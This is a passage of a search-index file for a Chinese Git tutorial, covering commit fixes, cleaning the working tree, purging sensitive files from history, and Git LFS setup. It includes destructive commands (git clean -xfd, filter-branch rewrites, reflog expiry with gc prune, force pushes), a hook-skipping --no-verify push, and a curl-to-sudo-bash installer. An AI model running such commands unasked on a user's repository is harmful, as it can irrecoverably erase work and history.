\u91cd\u65b0\u63d0\u4ea4\u4e00\u6b21\uff0c\u8fd9\u6837\u5c31\u80fd\u591f\u5c06\u4e4b\u95f4\u6587\u4ef6\u548c\u5fd8\u4e86\u7684\u6587\u4ef6\u4e00\u8d77\u63d0\u4ea4\u4e86 $ git commit --amend","title":"\u5bf9\u63d0\u4ea4\u7684\u8865\u6551"},{"location":"git/git/#stage","text":"# \u6682\u5b58\u4e00\u4e2a\u6587\u4ef6test.txt $ git add test.txt # \u53d1\u73b0\u8be5\u6587\u4ef6\u4e0d\u9700\u8981\u6682\u5b58\uff0c\u90a3\u5c31\u64a4\u9500\u5427 $ git reset HEAD test.txt # \u4e0d\u60f3\u8981\u8fd9\u4e9b\u4fee\u6539\u4e86\uff0c\u4e22\u5f03\u4fee\u6539\uff0c\u6267\u884c\u5b8c\u540e\u56de\u5230\u6700\u8fd1\u7684\u6682\u5b58\u72b6\u6001\uff0c\u5982\u679c\u6ca1\u6709\u6682\u5b58\u6587\u4ef6\uff0c\u5219\u56de\u9000\u5230\u6700\u65b0\u7684\u7248\u672c $ git checkout -- test.txt","title":"\u6682\u5b58staged"},{"location":"git/git/#show-log","text":"$ git log -- <file> # \u67e5\u770b\u6bcf\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\u5dee\u5f02 $ git log -p -2 -- <file> # \u53c2\u6570\uff1a-p \u8868\u793a\u6bcf\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\u5dee\u5f02\uff0c-2 \u5219\u8868\u793a\u663e\u793a\u6700\u8fd1\u7684\u4e24\u6b21\u66f4\u65b0\u3002 # \u8bf4\u660e\uff1a\u8be5\u9009\u9879\u9664\u4e86\u663e\u793a\u57fa\u672c\u4fe1\u606f\u4e4b\u5916\uff0c\u8fd8\u5728\u9644\u5e26\u4e86\u6bcf\u6b21 commit \u7684\u53d8\u5316\u3002","title":"\u67e5\u770b\u5386\u53f2\u63d0\u4ea4\u8bb0\u5f55"},{"location":"git/git/#rename","text":"$ git mv oldname newname $ git mv -f oldfolder newfolder $ git add -u newfolder (-u\u9009\u9879\u4f1a\u66f4\u65b0\u5df2\u7ecf\u8ffd\u8e2a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939) $ git commit -m \"changed the foldername whaddup\"","title":"\u91cd\u547d\u540d\u6587\u4ef6\u6216\u6587\u4ef6\u5939"},{"location":"git/git/#clean-work-folder","text":"\u53bb\u9664\u5de5\u4f5c\u533a\u7684\u4fee\u6539\uff0c\u6e05\u7a7a\u5de5\u4f5c\u76ee\u5f55\u4e2d\u65e0\u7248\u672c\u8ddf\u8e2a\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u53bb\u9664\u6682\u5b58\u533a\u7684\u6587\u4ef6\uff0c\u6807\u7eff\u7684\u6587\u4ef6\uff08git add\u7684\u6587\u4ef6\uff09,\u8fd9\u6837\u6682\u5b58\u533a\u7684\u6587\u4ef6\u4f1a\u53d8\u4e3amodify $ git reset . \u53bb\u6389modify\u7684\u6587\u4ef6\uff0c\u76f8\u5f53\u4e8e\u5168\u90e8\u5220\u9664\u81ea\u5df1\u7684\u4fee\u6539 $ git checkout . \u6709\u65f6\u5019\u56e0\u4e3a\u51b2\u7a81\u5bfc\u81f4\u5de5\u4f5c\u533a\u6709\u597d\u591auntrack\u7684\u6587\u4ef6\uff0c\u60f3\u8981\u6e05\u7a7a\u5de5\u4f5c\u533a # \u5220\u9664 untracked files $ git clean -f # \u8fde untracked \u7684\u76ee\u5f55\u4e5f\u4e00\u8d77\u5220\u6389 $ git clean -fd # \u8fde gitignore \u7684untrack \u6587\u4ef6/\u76ee\u5f55\u4e5f\u4e00\u8d77\u5220\u6389 \uff08\u614e\u7528\uff0c\u4e00\u822c\u8fd9\u4e2a\u662f\u7528\u6765\u5220\u6389\u7f16\u8bd1\u51fa\u6765\u7684 .o\u4e4b\u7c7b\u7684\u6587\u4ef6\u7528\u7684\uff09 $ git clean -xfd \u52a0\u4e0a -n \u53c2\u6570\u6765\u5148\u770b\u770b\u4f1a\u5220\u6389\u54ea\u4e9b\u6587\u4ef6\uff0c\u9632\u6b62\u91cd\u8981\u6587\u4ef6\u88ab\u8bef\u5220","title":"\u6e05\u7406\u5de5\u4f5c\u533a"},{"location":"git/git/#delete-files-and-history-permanently","text":"\u6709\u4e9b\u65f6\u5019\u4e0d\u5c0f\u5fc3\u4e0a\u4f20\u4e86\u4e00\u4e9b\u654f\u611f\u6587\u4ef6(\u4f8b\u5982\u5bc6\u7801), \u6216\u8005\u4e0d\u60f3\u4e0a\u4f20\u7684\u6587\u4ef6\u6ca1\u53ca\u65f6\u6216\u5fd8\u4e86\u52a0\u5230.gitignore\u91cc\u7684,\u800c\u4e14\u4e0a\u4f20\u7684\u6587\u4ef6\u53c8\u7279\u522b\u5927\u7684\u65f6\u5019, \u8fd9\u5c06\u5bfc\u81f4\u522b\u4ebaclone\u4f60\u7684\u4ee3\u7801\u6216\u4e0b\u8f7dzip\u5305\u7684\u65f6\u5019\u4e5f\u5fc5\u987b\u66f4\u65b0\u6216\u4e0b\u8f7d\u8fd9\u4e9b\u65e0\u7528\u7684\u6587\u4ef6,\u56e0\u6b64, \u6211\u4eec\u9700\u8981\u4e00\u4e2a\u65b9\u6cd5, \u6c38\u4e45\u7684\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6(\u5305\u62ec\u8be5\u6587\u4ef6\u7684\u5386\u53f2\u8bb0\u5f55). \u6b65\u9aa41. \u4f7f\u7528 git filter-branch \u5220\u9664\u6587\u4ef6 $ git filter-branch --force --index-filter \\ 'git rm --cached --ignore-unmatch PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA' \\ --prune-empty --tag-name-filter cat -- --all \u5176\u4e2d, PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA \u5c31\u662f\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84(\u76f8\u5bf9\u4e8egit\u4ed3\u5e93\u7684\u6839\u76ee\u5f55), \u66ff\u6362\u6210\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u8def\u5f84\u5373\u53ef. \u6ce8\u610f\u4e00\u70b9\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u5982\u679c\u4ee5 '/' \u5f00\u5934\uff0c\u5219\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4ece git \u7684\u5b89\u88c5\u76ee\u5f55\u5f00\u59cb\u3002 \u5982\u679c\u4f60\u8981\u5220\u9664\u7684\u76ee\u6807\u4e0d\u662f\u6587\u4ef6\uff0c\u800c\u662f\u6587\u4ef6\u5939\uff0c\u90a3\u4e48\u8bf7\u5728 git rm --cached \u547d\u4ee4\u540e\u9762\u6dfb\u52a0 -r \u547d\u4ee4\uff0c\u8868\u793a\u9012\u5f52\u7684\u5220\u9664\uff08\u5b50\uff09\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6\uff0c\u7c7b\u4f3c\u4e8e rm -rf \u547d\u4ee4\u3002 \u5982\u679c\u4f60\u8981\u5220\u9664\u7684\u6587\u4ef6\u5f88\u591a, \u53ef\u4ee5\u5199\u8fdb\u4e00\u4e2a .sh \u6587\u4ef6\u6279\u91cf\u6267\u884c, \u5982\u679c\u6587\u4ef6\u6216\u8def\u5f84\u91cc\u6709\u4e2d\u6587, \u7531\u4e8eMinGW\u6216CygWin\u5bf9\u4e2d\u6587\u8def\u5f84\u8bbe\u7f6e\u6bd4\u8f83\u9ebb\u70e6, \u4f60\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 * \u53f7, \u4f8b\u5982: sound/music_*.mp3 , \u8fd9\u6837\u5c31\u628asound\u76ee\u5f55\u4e0b\u4ee5 music_ \u5f00\u5934\u7684mp3\u6587\u4ef6\u90fd\u5220\u9664\u4e86. \u4f8b\u5982:\u65b0\u5efa\u4e00\u4e2a bash \u811a\u672c\u6587\u4ef6\uff0c del-music-mp3.sh : #!/bin/bash git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch projects/Moon.mp3' --prune-empty --tag-name-filter cat -- --all git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch sound/Music_*.mp3' --prune-empty --tag-name-filter cat -- --all \u5982\u679c\u4f60\u770b\u5230\u7c7b\u4f3c\u4e0b\u9762\u8fd9\u6837\u7684, \u5c31\u8bf4\u660e\u5220\u9664\u6210\u529f\u4e86: Rewrite 48dc599c80e20527ed902928085e7861e6b3cbe6 (266/266) # Ref 'refs/heads/master' was rewritten \u5982\u679c\u663e\u793a xxxxx unchanged , \u8bf4\u660erepo\u91cc\u6ca1\u6709\u627e\u5230\u8be5\u6587\u4ef6, \u8bf7\u68c0\u67e5\u8def\u5f84\u548c\u6587\u4ef6\u540d\u662f\u5426\u6b63\u786e. \u5982\u679c\u4f60\u60f3\u4ee5\u540e\u4e5f\u4e0d\u4f1a\u518d\u4e0a\u4f20\u8fd9\u4e2a\u6587\u4ef6\u6216\u6587\u4ef6\u5939, \u8bf7\u628a\u8fd9\u4e2a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u6dfb\u52a0\u5230 .gitignore \u6587\u4ef6\u91cc, \u7136\u540e\u518dpush\u4f60\u7684repo. \u6b65\u9aa42. \u63a8\u9001\u4fee\u6539\u540e\u7684repo \u4ee5\u5f3a\u5236\u8986\u76d6\u7684\u65b9\u5f0f\u63a8\u9001\u4f60\u7684repo, \u547d\u4ee4\u5982\u4e0b: $ git push origin master --force --all Counting objects: 4669, done. Delta compression using up to 4 threads. Compressing objects: 100% (4352/4352), done. Writing objects: 100% (4666/4666), 35.16 MiB | 51 KiB/s, done. Total 4666 (delta 1361), reused 0 (delta 0) To https://github.com/defunkt/github-gem.git + beb839d...81f21f3 master -> master (forced update) \u8fd9\u4e2a\u8fc7\u7a0b\u5176\u5b9e\u662f\u91cd\u65b0\u4e0a\u4f20\u6211\u4eec\u7684repo, \u6bd4\u8f83\u8017\u65f6, \u867d\u7136\u8ddf\u5220\u6389\u91cd\u65b0\u5efa\u4e00\u4e2arepo\u6709\u4e9b\u7c7b\u4f3c, \u4f46\u662f\u597d\u5904\u662f\u4fdd\u7559\u4e86\u539f\u6709\u7684\u66f4\u65b0\u8bb0\u5f55, \u6240\u4ee5\u8fd8\u662f\u6709\u4e9b\u4e0d\u540c\u7684. \u5982\u679c\u4f60\u5b9e\u5728\u4e0d\u5728\u610f\u8fd9\u4e9b\u66f4\u65b0\u8bb0\u5f55, \u4e5f\u53ef\u4ee5\u5220\u6389\u91cd\u5efa, \u4e24\u8005\u4e5f\u5dee\u4e0d\u592a\u591a, \u4e5f\u8bb8\u540e\u8005\u8fd8\u66f4\u76f4\u89c2\u4e9b. \u4e3a\u4e86\u80fd\u4ece\u6253\u4e86 tag \u7684\u7248\u672c\u4e2d\u4e5f\u5220\u9664\u4f60\u6240\u6307\u5b9a\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u547d\u4ee4\u6765\u5f3a\u5236\u63a8\u9001\u60a8\u7684 Git tags\uff1a $ git push origin master --force --tags \u544a\u8bc9\u60a8\u7684\u534f\u4f5c\u8005\uff0c\u4ece\u60a8\u7684\u65e7(\u53d7\u6c61\u67d3\u7684)\u5b58\u50a8\u5e93\u5386\u53f2\u4e2d\u91cd\u65b0\u521b\u5efa\u5206\u652f\uff0c\u800c\u4e0d\u662f\u5408\u5e76\u5b83\u4eec\u3002\u4e00\u4e2a\u5408\u5e76\u63d0\u4ea4\u53ef\u80fd\u4f1a\u91cd\u65b0\u5f15\u5165\u4e00\u4e9b\u6216\u6240\u6709\u60a8\u521a\u521a\u9677\u5165\u6e05\u9664\u9ebb\u70e6\u7684\u53d7\u6c61\u67d3\u7684\u5386\u53f2\u3002 \u6b65\u9aa43. \u6e05\u7406\u548c\u56de\u6536\u7a7a\u95f4 \u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\uff0c\u60a8\u786e\u4fe1 git filter-branch \u6ca1\u6709\u610f\u5916\u7684\u526f\u4f5c\u7528\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5f3a\u5236\u89e3\u9664\u5bf9\u672c\u5730\u5b58\u50a8\u5e93\u4e2d\u7684\u6240\u6709\u5bf9\u8c61\u7684\u5f15\u7528\u548c\u5783\u573e\u56de\u6536(GC)\u3002 $ git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin $ git reflog expire --expire=now --all $ git gc --prune=now Counting objects: 2437, done. Delta compression using up to 4 threads. Compressing objects: 100% (1378/1378), done. Writing objects: 100% (2437/2437), done. Total 2437 (delta 1461), reused 1802 (delta 1048) $ git gc --aggressive --prune=now Counting objects: 2437, done. Delta compression using up to 4 threads. Compressing objects: 100% (2426/2426), done. Writing objects: 100% (2437/2437), done. Total 2437 (delta 1483), reused 0 (delta 0) \u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5c06\u8fc7\u6ee4\u540e\u7684\u5386\u53f2\u63a8\u5165\u4e00\u4e2a\u65b0\u7684\u6216\u7a7a\u7684\u5b58\u50a8\u5e93\uff0c\u7136\u540e\u4eceGitHub\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u514b\u9686\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002 \u4e0a\u9762\u547d\u4ee4\u7684\u7b2c\u4e00\u53e5\u4e5f\u53ef\u4ee5\u6362\u6210: $ rm -rf .git/refs/original/ git filter-branch \u6709\u5f88\u591a\u9677\u9631\uff0c\u8fd9\u4e9b\u9677\u9631\u53ef\u80fd\u4f1a\u5bf9\u9884\u671f\u7684\u5386\u53f2\u91cd\u5199\u4ea7\u751f\u4e0d\u660e\u663e\u7684\u7834\u574f\uff08\u5e76\u4e14\u7531\u4e8e\u5b83\u7684\u6027\u80fd\u5982\u6b64\u7cdf\u7cd5\uff0c\u56e0\u6b64\u60a8\u51e0\u4e4e\u6ca1\u6709\u65f6\u95f4\u8c03\u67e5\u6b64\u7c7b\u95ee\u9898\uff09\u3002\u8fd9\u4e9b\u5b89\u5168\u548c\u6027\u80fd\u95ee\u9898\u4e0d\u80fd\u5411\u540e\u517c\u5bb9\u4fee\u590d\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528\u5b83\u3002\u8bf7\u4f7f\u7528\u66ff\u4ee3\u5386\u53f2\u8fc7\u6ee4\u5de5\u5177\uff0c\u4f8b\u5982 git filter-repo \u3002 \u53c2\u8003 github\u7684\u5e2e\u52a9 remove sensitive data ,\u8bf4\u660e\u4e86\u4e00\u79cd\u4f7f\u7528BFG\u5de5\u5177\u7684\u601d\u8def\uff0c\u53ef\u80fd\u66f4\u4fbf\u5229\u3002","title":"\u6c38\u4e45\u5220\u9664\u6587\u4ef6\u548c\u5386\u53f2\u8bb0\u5f55"},{"location":"git/git_lfs/","text":"Git LFS \uf0c1 Git LFS \u662f Github \u5f00\u53d1\u7684\u4e00\u4e2a Git \u7684\u6269\u5c55\uff0c\u7528\u4e8e\u5b9e\u73b0 Git \u5bf9\u5927\u6587\u4ef6\u7684\u652f\u6301\u3002 \u4f7f\u7528\u76ee\u7684 \uf0c1 \u6709\u4e9b\u7528\u6237\uff0c\u5c24\u5176\u662f\u6e38\u620f\u884c\u4e1a\u4ee5\u53ca\u5a92\u4f53\u884c\u4e1a\u4eba\u5458\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u90a3\u5c31\u662f\u968f\u7740\u63d0\u4ea4\u7684\u6587\u4ef6\u8d8a\u6765\u8d8a\u591a\uff0c\u9879\u76ee \u8d8a\u6765\u8d8a\u5927\uff0cGit\u7684\u54cd\u5e94\u901f\u5ea6\u8d8a\u6765\u8d8a\u6162\uff0c\u66f4\u70e6\u4eba\u7684\u662f\uff0c\u5728\u63d0\u4ea4\u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6700\u540e\u4e00\u523b\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u63d0\u793a\u7528\u6237\u6b64\u6b21 \u63d0\u4ea4\u88ab\u62d2\u7edd\uff0c\u539f\u56e0\u662f\u63d0\u4ea4\u7684\u6587\u4ef6\u592a\u5927\uff0c\u89e6\u53d1\u5e73\u53f0\u989d\u5ea6\u9650\u5236(\u65e0\u8bba\u662f\u54ea\u4e2a\u5e73\u53f0)\uff0c\u76f8\u4fe1\u5f88\u591a\u4eba\u5728\u8fd9\u4e00\u523b\u662f\u5d29\u6e83\u7684\u3002 Git LFS(Git Large File Storage)\uff0c\u5373Git\u5927\u6587\u4ef6\u5b58\u50a8\u6280\u672f\u3002 \u5728Git\u4ed3\u5e93\u4e2d\uff0c\u5bf9\u4e8e\u975e\u6587\u672c\u6587\u4ef6\uff0c\u5982\u5404\u79cd\u591a\u5a92\u4f53\u6587\u4ef6\uff0c\u8f6f\u4ef6\u5236\u54c1\u6587\u4ef6\uff0c\u4e8c\u8fdb\u5236\u6587\u4ef6\u7b49\u7b49\uff0c\u8fd9\u4e9b\u6587\u4ef6 \u5f80\u5f80\u4f53\u79ef\u6bd4\u8f83\u5927\uff0c\u4f7f\u7528Git\u76f4\u63a5\u7ba1\u7406\u4f1a\u5bfc\u81f4\u4ed3\u5e93\u7684\u4f53\u79ef\u8fc5\u901f\u81a8\u80c0\uff0c\u8fdb\u800c\u5bfc\u81f4Git\u7684\u8bb8\u591a\u64cd\u4f5c\u53d8\u6162\uff0c\u540c \u65f6\u4e5f\u5f71\u54cd\u4ed3\u5e93\u4e0a\u4f20\u5230\u8fdc\u7a0b\u7aef\u3002 Git LFS\u76f8\u5f53\u4e8eGit\u7684\u4e00\u79cd\u63d2\u4ef6\u5f0f\u589e\u5f3a\u5de5\u5177\uff0c\u7b80\u5355\u8bb2\uff0c\u5b83\u662f\u5728Git\u4ed3\u5e93\u4f7f\u7528\u8fd9\u4e9b\u6587\u4ef6\u7684 \u6307\u9488 \u4ee3\u66ff \u5b9e\u9645\u6587\u4ef6 \uff0c \u800c\u628a\u5b9e\u9645\u6587\u4ef6\u5b58\u50a8\u5728\u8fdc\u7a0b\u7aefLFS\u670d\u52a1\u5668\uff0c\u540c\u65f6\u5728\u672c\u5730\u4ed3\u5e93\u4e2d\u5b9e\u65f6\u8ffd\u8e2a\u8fd9\u4e9b\u6587\u4ef6\u7684\u53d8\u52a8\u3002 \u539f\u7406 \uf0c1 \u6839\u636e Git LFS \u5b98\u65b9\u5e2e\u52a9\u6587\u6863\u63cf\u8ff0\uff1a Git LFS\u662f\u57fa\u4e8eGit\u7684 .gitattributs \u914d\u7f6e\u6587\u4ef6\u7684\u7279\u6027\uff0c\u7528 smudge \u8fc7\u6ee4\u5668\u57fa\u4e8e \u6307\u9488\u6587\u4ef6 \u5bfb\u627e\u5927\u6587\u4ef6\u5185 \u5bb9\uff0c \u7528 clean \u8fc7\u6ee4\u5668\u5728\u5bf9\u5927\u6587\u4ef6\u6539\u52a8\u65f6\uff0c\u521b\u5efa\u6307\u9488\u6587\u4ef6\u7684\u65b0\u7248\u672c\u3002\u540c\u65f6\u8fd8\u7528 pre-push \u94a9\u5b50\u5c06\u5927\u6587\u4ef6\u4e0a\u4f20 \u5230Git LFS\u670d\u52a1\u5668\uff0c \u5373\u5728 git-push \u65f6\uff0c \u5982\u679c\u63d0\u4ea4\u4e2d\u5305\u542b\u88abLFS\u8ddf\u8e2a\u7684\u5927\u6587\u4ef6\uff0c pre-push \u94a9\u5b50\u4f1a\u68c0\u6d4b \u5230\uff0c\u5e76\u6267\u884c\u4e0a\u4f20Git LFS\u670d\u52a1\u5668\u7684\u52a8\u4f5c\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u4ed3\u5e93\u4e2d\u5305\u542bLFS\u5185\u5bb9\uff0c\u4f46\u662f\u5728\u63a8\u9001\u65f6\u4e0d\u60f3\u63a8\u9001\u8fd9\u7c7b\u6587\u4ef6\uff0c\u53ea\u8981\u52a0\u4e0a --no-verify \u9009\u9879\u5c31\u884c\uff0c\u5373\uff1a $ git push --no-verify --no-verify \u9009\u9879\u544a\u8bc9 git push \u5b8c\u5168\u8df3\u8fc7 pre-push \u94a9\u5b50\u3002 \u524d\u9762\u63d0\u5230\u88abLFS\u7ba1\u7406\u7684\u6587\u4ef6\uff0c\u672c\u5730\u4ed3\u5e93\u4e2d\u4fdd\u5b58\u7684\u5185\u5bb9\u5b9e\u9645\u4e0a\u662f\u6307\u9488\u6587\u4ef6\uff0c\u5176\u683c\u5f0f\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u8fd9\u6837\uff1a $ git show HEAD:2.svg version https://git-lfs.github.com/spec/v1 oid sha256:158213f90f8b27012034c6f58db63e1861b12aa122d98910de311bf1cb1e50a0 size 14651 (END) version \u8868\u793aLFS\u7684\u7248\u672c oid \u8868\u793a\u6587\u4ef6\u5bf9\u8c61\u7684\u552f\u4e00hash\u503c size \u8868\u793a\u6587\u4ef6\u7684\u5927\u5c0f \u5b89\u88c5 \uf0c1 \u6ce8\u610f\uff1a\u4ee5\u4e0b\u5b89\u88c5\u4ee5\u53ca\u547d\u4ee4\u4f7f\u7528\u6f14\u793a\uff0c\u5747\u662f\u57fa\u4e8eLinux\u4e2d\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8fdb\u884c\uff0cWindows\u4e0a\u7684\u56fe\u50cf\u754c\u9762 \u64cd\u4f5c\uff0c\u7531\u4e8e\u65f6\u95f4\u5173\u7cfb\uff0c\u6682\u4e0d\u6d89\u53ca\u3002 \u5b89\u88c5\u4f9d\u8d56\uff1a Git >=1.8.5 Linux \u7cfb\u7edf\uff1a curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash sudo apt-get install git-lfs https://packagecloud.io/github/git-lfs/install#bash \u5176\u5b83\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u5b89\u88c5\uff0c\u89c1\u5b98\u65b9\u5b89\u88c5\u6587\u6863\uff1a https://github.com/git-lfs/git-lfs#installing \u7528\u6cd5 \uf0c1 \u5728Git\u4ed3\u5e93\u4e2d\u4e3a\u4ed3\u5e93\u8bbe\u7f6e\u76f8\u5173\u914d\u7f6e\uff1a $ git lfs install Tips: \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u81ea\u52a8\u6539\u53d8Git\u914d\u7f6e\u6587\u4ef6 .gitconfig\uff0c\u800c\u4e14\u662f\u5168\u5c40\u6027\u8d28\u7684\uff0c\u4f1a\u81ea\u52a8\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u589e\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a [filter \"lfs\"] clean = git-lfs clean -- %f smudge = git-lfs smudge -- %f process = git-lfs filter-process required = true \u9009\u62e9\u8981\u7528LFS\u8ffd\u8e2a\u7684\u6587\u4ef6\uff1a $ git lfs track \"*.svg\" # \u6216\u8005\u5177\u4f53\u5230\u67d0\u4e2a\u6587\u4ef6 $ git lfs track \"2.png\" $ git lfs track \"example.lfs\" Tips: \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u66f4\u6539\u4ed3\u5e93\u4e2d\u7684 .gitattributes\u914d\u7f6e\u6587\u4ef6(\u5982\u679c\u4e4b\u524d\u4e0d\u5b58\u5728\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5219\u4f1a\u81ea\u52a8\u65b0\u5efa): \u67e5\u770b\u5982\u4e0b\uff1a $ cat .gitattributes *.svg filter=lfs diff=lfs merge=lfs -text *.png filter=lfs diff=lfs merge=lfs -text \u67e5\u770b\u6b63\u5728\u88abLFS\u8ffd\u8e2a\u7684\u6587\u4ef6\uff1a $ git lfs ls-files 9a3c7dae41 * 1.png d61cf5835a * 2.png 158213f90f * 3.svg git add file \u4e4b\u540e\u6587\u4ef6\u624d\u53ef\u80fd\u88ab\u8ffd\u8e2a\uff0c\u4e5f\u624d\u80fd\u67e5\u770b\u5f97\u5230 \u53d6\u6d88LFS\u8ffd\u8e2a\u7684\u6587\u4ef6: $ git lfs untrack \"1.png\" \u4fdd\u5b58\u5e76\u63d0\u4ea4\u914d\u7f6e\uff1a $ git add .gitattributes $ git commit -m \"add .gitattributes\" \u7528\u6cd5\u603b\u7ed3 \uf0c1 \u5b89\u88c5Git LFS\u4e4b\u540e\uff0c\u53ea\u9700\u4e09\u6b65\uff0c\u5373\u53ef\u5728\u4ed3\u5e93\u4e2d\u914d\u7f6eLFS\u529f\u80fd\uff0c\u5373\uff1a #step 1 $ git lfs install #step 2 $ git lfs track files # step 3 $ git add .gitattributes \u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u7b2c\u4e00\u6b65\u662f\u5168\u5c40\u914d\u7f6e\uff0c\u6240\u4ee5\u6267\u884c\u4e00\u6b21\u5373\u53ef\uff0c\u540e\u7eed\u6709\u5176\u5b83\u4ed3\u5e93\u9700\u8981\u4f7f\u7528LFS\uff0c\u5219\u4e0d\u9700\u8981\u518d\u6b21\u6267\u884c\uff0c\u9664\u975e\u4e2d\u9014\u53d6\u6d88\u4e86LFS\u914d\u7f6e\u3002 Tips\uff1a \u8fd0\u884c git lfs uninstall \u5373\u53ef\u53d6\u6d88LFS\u7684\u5168\u5c40\u914d\u7f6e \u4f7f\u7528LFS\u7ba1\u7406\u5386\u53f2\u5927\u6587\u4ef6 \uf0c1 \u5982\u679c\u4e00\u4e2a\u4ed3\u5e93\u4e2d\u539f\u6765\u5df2\u7ecf\u63d0\u4ea4\u4e86\u4e00\u4e9b\u5927\u6587\u4ef6\uff0c\u6b64\u65f6\u5373\u4f7f\u8fd0\u884c git lfs track \u4e5f\u4e0d\u4f1a\u6709\u6548\u7684\u3002 \u4e3a\u4e86\u5c06\u4ed3\u5e93\u4e2d\u73b0\u5b58\u7684\u5927\u6587\u4ef6\u5e94\u7528\u5230LFS\uff0c\u9700\u8981\u7528 git lfs migrate \u5bfc\u5165\u5230LFS\u4e2d\uff1a $ git lfs migrate import --include-ref=master --include=\"biger.zip\" migrate: override changes in your working copy? All uncommitted changes will be lost! [y/N] y migrate: changes in your working copy will be overridden ... migrate: Sorting commits: ..., done. migrate: Rewriting commits: 100% (11/11), done. master f9be3c554e9010ea5e0e23a6a0c6e53dca6c23b0 -> 53d5e655fe7cfd985f75384b92ac5414ad2ff394 migrate: Updating refs: ..., done. migrate: checkout: ..., done. --include-ref \u9009\u9879\u6307\u5b9a\u5bfc\u5165\u7684\u5206\u652f \u5982\u679c\u5411\u5e94\u7528\u5230\u6240\u6709\u5206\u652f\uff0c\u5219\u4f7f\u7528--everything\u9009\u9879 --include \u9009\u9879\u6307\u5b9a\u8981\u5bfc\u5165\u7684\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u6279\u91cf\u5bfc\u5165\u3002 \u4e0a\u8ff0\u64cd\u4f5c\u4f1a\u6539\u5199\u63d0\u4ea4\u5386\u53f2\uff0c\u5982\u679c\u4e0d\u60f3\u6539\u5199\u5386\u53f2\uff0c\u5219\u4f7f\u7528 --no-rewrite \u9009\u9879\uff0c\u5e76\u63d0\u4f9b\u65b0\u7684commit\u4fe1\u606f\uff1a $ git lfs migrate import --no-rewrite -m \"lfs import\" \u5c06\u672c\u5730\u5386\u53f2\u63d0\u4ea4\u4e2d\u7684\u6587\u4ef6\u7eb3\u5165\u5230LFS\u7ba1\u7406\u540e\uff0c\u5982\u679c\u91cd\u6539\u4e86\u5386\u53f2\uff0c\u518d\u6b21\u63a8\u9001\u4ee3\u7801\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u5f3a\u5236\u63a8\u9001\u3002 \u8fd9\u91cc\u9009\u62e9\u6539\u53d8\u63d0\u4ea4\u5386\u53f2\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u4f7f\u7528 --force \u5f3a\u5236\u63a8\u9001\uff1a $ git push origin master --force Enter passphrase for key '/home/git/.ssh/id_ed25519': Locking support detected on remote \"origin\". Consider enabling it with: $ git config lfs.https://gitee.com/hightest/lfs-demo.git/info/lfs.locksverify true Uploading LFS objects: 100% (8/8), 419 MB | 0 B/s, done. Enumerating objects: 38, done. Counting objects: 100% (38/38), done. Delta compression using up to 6 threads Compressing objects: 100% (37/37), done. Writing objects: 100% (38/38), 136.26 MiB | 943.00 KiB/s, done. Total 38 (delta 12), reused 10 (delta 0), pack-reused 0 remote: Powered by GITEE.COM [GNK-6.1] To gitee.com:hightest/lfs-demo.git + cefd169...53d5e65 master -> master (forced update) \u81f3\u6b64\uff0c\u5df2\u7ecf\u5c06\u5386\u53f2\u63d0\u4ea4\u4e2d\u7684\u5927\u6587\u4ef6\u8fc1\u79fb\u5230\u8fdc\u7a0bLFS\u670d\u52a1\u5668\uff0c\u672c\u5730Git\u4ed3\u5e93\uff0c\u53ea\u4fdd\u7559\u8fd9\u4e2a\u5927\u6587\u4ef6\u7684\u6307\u9488 \u6587\u4ef6\uff0c\u6240\u4ee5\u63a8\u9001\u4e5f\u4e0d\u4f1a\u518d\u89e6\u53d1\u989d\u5ea6\u9650\u5236\u3002\u63a8\u9001\u6210\u529f\u4e4b\u540e\uff0c\u8fdc\u7a0b\u4ed3\u5e93\u5c31\u4e0e\u672c\u5730\u4fdd\u5b58\u4e00\u81f4\uff0c\u5b83\u53ea\u7ba1\u7406\u8fd9\u4e2a\u5927\u6587\u4ef6\u7684\u6307\u9488\u6587\u4ef6\u3002 \u5e2e\u52a9\u547d\u4ee4 